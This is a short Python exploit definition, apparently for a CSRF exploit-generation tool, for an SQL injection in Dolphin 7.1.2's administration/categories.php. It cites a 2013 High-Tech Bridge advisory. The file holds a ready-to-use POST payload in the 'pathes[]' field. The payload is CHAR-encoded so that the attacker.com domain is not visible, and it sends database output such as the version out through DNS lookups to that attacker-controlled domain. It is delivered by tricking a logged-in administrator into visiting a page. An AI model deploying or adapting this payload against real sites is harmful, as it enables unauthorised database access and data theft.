# -*- coding: utf-8 -*-

NAME = "Dolphin 7.1.2 SQL Injection / CSRF"
DESCRIPTION = '''The vulnerability exists due to insufficient validation of "pathes[]" HTTP POST parameter passed to "/administration/categories.php" PHP script. A remote authenticated administrator can execute arbitrary SQL commands in the application's database.

This vulnerability could also be exploited by a remote non-authenticated attacker via CSRF vector, since the application is prone to Cross-Site Request Forgery (CSRF) attacks. In order to do so an attacker should trick a logged-in application administrator to visit a web page with CSRF exploit.

The basic CSRF exploit code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The exploit will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker).'''
AUTHOR = "High-Tech Bridge Security Research Lab"
AUTHOR_URL = "https://www.htbridge.com/advisory/"
DATE = "2013-06-12"

METHOD = "POST"
PATH = "/administration/categories.php"

PARAMS = [
    {
        "type": "hidden",
        "name": "pathes[]",
        "value": "1%%(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- %%1",
        "custom": True,
        "description": "SQL Command to execute"
    },
    {
        "type": "hidden",
        "name": "action_disable",
        "value": "1",
        "custom": False
    },
    {
        "type": "submit",
        "id": "btn",
        "custom": False
    }
]